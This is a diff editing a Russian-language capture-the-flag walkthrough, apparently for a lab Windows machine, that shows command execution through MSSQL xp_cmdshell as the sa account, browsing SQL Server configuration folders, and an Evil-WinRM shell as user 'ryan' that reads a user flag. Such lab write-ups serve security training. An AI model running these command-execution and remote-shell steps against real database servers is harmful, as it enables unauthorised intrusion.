@@ -287,7 +287,7 @@ sequel\sql_svc
 NULL
 ```
 
-Замечательно, теперь мы можем выполнять **power shell** комадны от лица `sql_svc`
+Замечательно, теперь мы можем выполнять комадны от лица `sql_svc`
 ```
 SQL (sa  dbo@master)> EXEC xp_cmdshell 'dir C:\'
 output                                                       
@@ -313,27 +313,6 @@ NULL
 ```
 
 На данном этапе, нас интересует папка `SQL2019`, а если точней - логи и файлы конфигурации **Microsoft SQL Server**
-```
-SQL (sa  dbo@master)> EXEC xp_cmdshell 'dir C:\SQL2019'
-output                                                  
------------------------------------------------------   
- Volume in drive C has no label.                        
- Volume Serial Number is 3705-289D                      
-
-NULL                                                    
- Directory of C:\SQL2019                                
-
-NULL                                                    
-06/08/2024  02:07 PM    <DIR>          .                
-06/08/2024  02:07 PM    <DIR>          ..               
-01/03/2025  07:29 AM    <DIR>          ExpressAdv_ENU   
-
-               0 File(s)              0 bytes           
-               3 Dir(s)   3,749,613,568 bytes free      
-
-NULL
-```
-
 ```
 SQL (sa  dbo@master)> EXEC xp_cmdshell 'dir C:\SQL2019\ExpressAdv_ENU\'
 output                                                            
@@ -442,36 +421,10 @@ Warning: Remote path completions is disabled due to ruby limitation: undefined m
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                         
 Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\ryan\Documents> ls
-*Evil-WinRM* PS C:\Users\ryan\Documents> cd ..
-*Evil-WinRM* PS C:\Users\ryan> ls
+*Evil-WinRM* PS C:\Users\ryan\Documents> 
+```
 
-    Directory: C:\Users\ryan
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
-d-r---         6/9/2024   4:24 AM                Desktop
-d-r---         1/6/2025   5:32 AM                Documents
-d-r---        9/15/2018  12:19 AM                Downloads
-d-r---        9/15/2018  12:19 AM                Favorites
-d-r---        9/15/2018  12:19 AM                Links
-d-r---        9/15/2018  12:19 AM                Music
-d-r---        9/15/2018  12:19 AM                Pictures
-d-----        9/15/2018  12:19 AM                Saved Games
-d-r---        9/15/2018  12:19 AM                Videos
-
-
-*Evil-WinRM* PS C:\Users\ryan> cd Desktop
-*Evil-WinRM* PS C:\Users\ryan\Desktop> ls
-
-
-    Directory: C:\Users\ryan\Desktop
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--ar---        1/27/2025   7:19 AM             34 user.txt
-
+```
 *Evil-WinRM* PS C:\Users\ryan\Desktop> more user.txt
 89f5090e4536a1c8d3634ddc0a2ae4d9
 ```
